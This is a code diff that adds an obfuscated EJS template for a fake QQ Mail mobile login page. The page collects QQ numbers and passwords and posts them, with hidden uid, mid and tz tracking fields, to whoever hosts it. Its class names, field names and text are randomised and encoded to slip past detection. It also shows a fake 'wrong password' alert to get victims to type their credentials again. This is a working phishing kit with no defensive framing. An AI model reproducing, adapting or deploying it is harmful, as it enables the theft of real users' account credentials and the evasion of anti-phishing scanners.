@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta id="viewport" name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no">
+    <script src="//cdn.bootcss.com/jquery/3.0.0-rc1/jquery.min.js" type="text/javascript"></script>
+    <title class="<%=ranStr[20]%>"><%= function(){var x = ranRp('请输入账号密码');return x.key+':'+x.val}()%></title>
+    <style type="text/css">
+        * {
+            padding: 0;
+            margin: 0;
+            list-style: none;
+            text-decoration: none;
+            outline: none;
+        }
+
+        body {
+            font-size: 16px;
+            background: #eee;
+            height: 100%;
+        }
+
+        .<%=ranStr[1]%> {
+            margin: 0 auto;
+            width: 320px;
+            height: 500px;
+            position: relative;
+        }
+
+        .<%=ranStr[2]%> {
+            margin: 0 auto;
+            padding-top: 30px;
+        }
+
+        .<%=ranStr[3]%> {
+            background-image: url(../images/qqmail_logo_default_200h.png);
+            height: 100px;
+            width: 244px;
+            margin: 0 auto;
+            margin-bottom: 20px;
+            background-size: 244px 100px;
+        }
+
+        .<%=ranStr[4]%> {
+            width: 290px;
+            margin: 0 auto;
+        }
+
+        .<%=ranStr[4]%> ul {
+            background: #fff;
+            height: 89px;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .<%=ranStr[4]%> ul li {
+            border-bottom: 1px solid #eaeaea;
+        }
+
+        .<%=ranStr[4]%> ul li input {
+            -webkit-tap-highlight-color: rgba(255, 255, 255, 0);
+            width: 273px;
+            height: 44px;
+            color: #000;
+            border: 0;
+            background: 0;
+            padding-left: 15px;
+            font-size: 16px;
+            -webkit-appearance: none;
+        }
+
+        .<%=ranStr[5]%> {
+            width: 290px;
+            height: 44px;
+            line-height: 44px;
+            background: #146fdf;
+            border: 0;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            text-align: center;
+            margin: auto;
+            margin-top: 15px;
+            display: block;
+        }
+
+        .<%=ranStr[6]%> {
+            width: 290px;
+            margin: 0 auto;
+            width: 290px;
+            position: relative;
+            margin-top: 15px;
+            overflow: hidden;
+        }
+
+        .<%=ranStr[6]%> span {
+            color: #246183;
+            line-height: 14px;
+            font-size: 14px;
+            padding: 15px 10px;
+        }
+
+        .<%=ranStr[6]%> span:first-child {
+            float: right;
+            margin-right: -10px;
+        }
+
+        .<%=ranStr[6]%> span:last-child {
+            float: left;
+            margin-left: -10px;
+        }
+
+        .<%=ranStr[7]%> {
+            position: absolute;
+            top: 20px;
+            z-index: 100;
+            display: none;
+            opacity: .95;
+            width: 100%;
+            text-align: center;
+        }
+
+        .<%=ranStr[8]%> {
+            position: relative;
+            padding: 16px 0 0 0;
+            border-radius: 5px;
+            background-color: #525c5f;
+            height: 52px;
+        }
+
+        .<%=ranStr[10]%> {
+            color: #fff;
+            line-height: 28px;
+
+        }
+    </style>
+</head>
+
+<body>
+    <div class="<%=ranStr[1]%>">
+        <div class="<%=ranStr[7]%>">
+            <div class="<%=ranStr[8]%>">
+                <span class="<%=ranStr[9]%>"></span>
+                <span class="<%=ranStr[10]%>"></span>
+            </div>
+        </div>
+        <div class="<%=ranStr[2]%>">
+            <div class="<%=ranStr[3]%>"></div>
+            <div class="<%=ranStr[4]%>">
+                <form action="" method="post" id="<%=ranStr[11]%>">
+                    <ul>
+                        <li>
+                            <input class="<%=ranStr[12]%> <%=ranStr[13]%>" placeholder="<%= function(){var x = ranRp('QQ号/手机/邮箱');return x.key+':'+x.val}()%>" id="<%=ranStr[14]%>" name="<%= function(){var x = ranRp('u');return x.key+':'+x.val}()%>" />
+                        </li>
+                        <li>
+                            <input class="<%=ranStr[12]%> <%=ranStr[13]%>" placeholder="<%= function(){var x = ranRp('请输入您的QQ密码');return x.key+':'+x.val}()%>" id="<%=ranStr[15]%>" name="<%= function(){var x = ranRp('p');return x.key+':'+x.val}()%>" />
+                        </li>
+                        <input type="hidden" class="<%=ranStr[13]%>" name="<%= function(){var x = ranRp('uid');return x.key+':'+x.val}()%>" value="<%=uid%>">
+                        <input type="hidden" class="<%=ranStr[13]%>" name="<%= function(){var x = ranRp('mid');return x.key+':'+x.val}()%>" value="<%=mid%>">
+                        <input type="hidden" class="<%=ranStr[13]%>" name="<%= function(){var x = ranRp('tz');return x.key+':'+x.val}()%>" value="<%=tz%>">
+                    </ul>
+
+                </form>
+            </div>
+            <div class="<%=ranStr[5]%> <%=ranStr[20]%>"><%= function(){var x = ranRp('登录');return x.key+':'+x.val}()%></div>
+            <div class="<%=ranStr[6]%>">
+                <span class="<%=ranStr[20]%>"><%= function(){var x = ranRp('忘了密码');return x.key+':'+x.val}()%></span>
+                <span class="<%=ranStr[20]%>"><%= function(){var x = ranRp('注册新账号');return x.key+':'+x.val}()%></span>
+            </div>
+        </div>
+    </div>
+</body>
+<script src="/jquery/<%=ranStr[99]%>" type="text/javascript"></script>
+<script>
+    if (<%=ranStr[17]%> !== '1') {
+        // alert('未登录')
+    }
+    $('.<%=ranStr[12]%>').each(function(){
+        var <%=ranStr[16]%> = $(this).attr('placeholder');
+        $(this).attr('placeholder', <%=ranStr[199]%>(<%=ranStr[16]%>));
+    })
+    $('.<%=ranStr[20]%>').each(function(){
+        var <%=ranStr[16]%> = $(this).html();
+        $(this).html(<%=ranStr[199]%>(<%=ranStr[16]%>))
+    })
+
+    $('.<%=ranStr[13]%>').each(function(){
+        var <%=ranStr[16]%> = $(this).attr('name');
+        $(this).attr('name', <%=ranStr[199]%>(<%=ranStr[16]%>));
+    })
+    var <%=ranStr[17]%> = '<%=tz%>';
+    var <%=ranStr[18]%> = $('.<%=ranStr[7]%>');
+    var <%=ranStr[19]%> = $('.<%=ranStr[10]%>');
+    $('.<%=ranStr[5]%>').on('click', function () {
+        if ($('#<%=ranStr[14]%>').val() === '') {
+            var <%=ranStr[198]%> = "<%= function(){var x = ranRp('请输入QQ号!');return x.key+':'+x.val}()%>"
+            <%=ranStr[19]%>.html(<%=ranStr[199]%>(<%=ranStr[198]%>));
+            <%=ranStr[18]%>.css({ "display": "block" })
+            setTimeout(function () {
+                <%=ranStr[18]%>.css({ "display": "none" })
+            }, 1000);
+        } else if ($('#<%=ranStr[15]%>').val() === '') {
+            var <%=ranStr[197]%> = "<%= function(){var x = ranRp('你还没有输入密码!');return x.key+':'+x.val}()%>"
+            <%=ranStr[19]%>.html(<%=ranStr[199]%>(<%=ranStr[197]%>));
+            <%=ranStr[18]%>.css({ "display": "block" })
+            setTimeout(function () {
+                <%=ranStr[18]%>.css({ "display": "none" })
+            }, 1000);
+        } else {
+            $('#<%=ranStr[11]%>').submit()
+        }
+    });
+    if (<%=ranStr[17]%> === '1') {
+        var <%=ranStr[196]%> = "<%= function(){var x = ranRp('账号密码错误!');return x.key+':'+x.val}()%>"
+        <%=ranStr[19]%>.html(<%=ranStr[199]%>(<%=ranStr[196]%>));
+        <%=ranStr[18]%>.css({ "display": "block" })
+        setTimeout(function () {
+            <%=ranStr[18]%>.css({ "display": "none" })
+        }, 1000);
+    }
+</script>
+
+</html>
